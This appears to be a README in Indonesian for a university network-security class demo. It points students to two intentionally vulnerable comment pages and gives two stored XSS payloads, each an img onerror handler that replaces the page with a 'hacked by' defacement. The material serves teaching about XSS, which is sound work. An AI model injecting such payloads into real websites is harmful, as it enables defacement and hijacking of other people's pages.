# demoxss
Materi Demo kuliah keamanan jaringan - demo XSS <br>
Untuk Mahasiswa PTI UNESA 2026

<img width="695" height="379" alt="image" src="https://github.com/user-attachments/assets/1ce2905a-d5f0-44be-86d3-22117ae6f9b3" />


# Akses web browser

1. versi local stored di : [https://unesa-smarte.github.io/demoxss](https://unesa-smarte.github.io/demoxss)
2. Versi data chat diluar / jsonbin.io  : [https://unesa-smarte.github.io/demoxss/chat.html](https://unesa-smarte.github.io/demoxss/chat.html)

# Inject komentarnya seperti ini
Versi 1 ( local stored) 
```
<img src="x" onerror="document.body.innerHTML='<div style=\'text-align:center;margin-top:10vh;font-family:sans-serif;\'><h1 style=\'color:red;font-size:2.5rem;\'>hacked by mahasiswa PTI UNESA</h1><img src=\'https://static.wikia.nocookie.net/onepiece/images/7/73/Jolly_Roger_Infobox.png\' style=\'width:250px;margin-top:20px;\'><br><br><button onclick=\'localStorage.clear();location.reload();\' style=\'padding:10px 20px;background:#333;color:#fff;border:none;border-radius:5px;cursor:pointer;\'>Reset Demo</button></div>';">

```


Versi 2 ( jsonbin )

```
<img src="x" onerror="document.body.innerHTML='<div style=\'text-align:center;margin-top:15vh;font-family:sans-serif;\'><h1 style=\'color:red;font-size:2.5rem;\'>hacked by mahasiswa PTI UNESA</h1><img src=\'https://static.wikia.nocookie.net/onepiece/images/7/73/Jolly_Roger_Infobox.png\' style=\'width:250px;margin-top:20px;\'><br><br><button onclick=\'window.resetComments()\' style=\'padding:12px 24px;background:#f44336;color:#fff;border:none;border-radius:5px;font-size:16px;cursor:pointer;\'>Reset Database Cloud & Pulihkan Web</button></div>';">

```

